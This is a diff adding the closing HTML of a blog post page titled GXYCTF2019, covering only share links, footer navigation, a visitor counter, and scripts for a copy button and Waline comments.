+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://baozongwi.xyz/posts/ce51adc0.html&title=GXYCTF2019"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://baozongwi.xyz/posts/ce51adc0.html&title=GXYCTF2019"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://baozongwi.xyz/posts/ce51adc0.html&title=GXYCTF2019"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://baozongwi.xyz/posts/ce51adc0.html&title=GXYCTF2019"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://baozongwi.xyz/posts/ce51adc0.html&name=GXYCTF2019&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://baozongwi.xyz/posts/ce51adc0.html&t=GXYCTF2019"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        baozongwi
+        <br>
+		<a href="https://www.dkdun.cn/" target="_blank">DK盾</a>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">Aβout</a></li><!--
+                --><!--
+                --><li><a href="/tags/">Topi3s</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Cat4gory</a></li><!--
+                --><!--
+                --><li><a href="/links/">Li^ks</a></li><!--
+                --><!--
+                --><li><a href="/search/">Seαrch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<!-- Waline Comments -->
+
+  <script type="module">
+    import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+
+    var EMOJI = ['//unpkg.com/@waline/emojis@1.2.0/weibo']
+    var META = ['nick', 'mail', 'link'];
+    var REQUIREDFIELDS = ['nick', 'mail', 'link'];
+
+    var emoji = '//unpkg.com/@waline/emojis@1.2.0/qq'.split(',').filter(function(item){
+      return item !== ''; // filter()返回满足不为空item
+    });
+    emoji = emoji.length == 0 ? EMOJI : emoji;
+
+    var meta = 'nick,mail'.split(',').filter(function(item){
+      return META.indexOf(item) > -1; // filter()返回满足META.indexOf(item) > -1为true的item
+    });
+    meta = meta.length == 0 ? META : meta;
+
+    var requiredFields = 'nick,mail'.split(',').filter(function(item){
+      return REQUIREDFIELDS.indexOf(item) > -1; // filter()返回满足META.indexOf(item) > -1为true的item
+    });
+    requiredFields = requiredFields.length == 0 ? REQUIREDFIELDS : requiredFields;
+
+    init({
+      el: '#waline_thread',
+      serverURL: 'https://waline.baozongwi.xyz/', // Waline 的服务端地址
+      path: '' == '' ? window.location.pathname : '', // 当前文章页路径，用于区分不同的文章页，以保证正确读取该文章页下的评论列表
+      lang: 'zh-CN' == '' ? 'zh-CN' : 'zh-CN', // 多语言支持，未设置默认英文
+      emoji: emoji,
+      dark: 'auto', // 暗黑模式适配
+      commentSorting: '' == '' ? 'latest' : '', // 评论列表排序方式
+      meta: meta, // 评论者相关属性
+      requiredFields: requiredFields, // 设置必填项，默认匿名
+      login: '', // 登录模式状态
+      wordLimit: '', // 评论字数限制
+      pageSize: '10' == '' ? 10 : '10', // 评论列表分页，每页条数
+      imageUploader: '', // 自定义图片上传方法
+      highlighter: '', // 代码高亮
+      locale: {
+          placeholder: 'ヾ(☆▽☆)ノ 等你来评论！', 
+          sofa: '這個評論區有點冷₍˄·͈༝·͈˄*₎◞ ̑̑', 
+        },
+      avatar: 'mp',
+      visitor: 'false',
+      comment_count: 'false',
+      review: true,
+    });
+  </script>
+
+</body>
+</html>
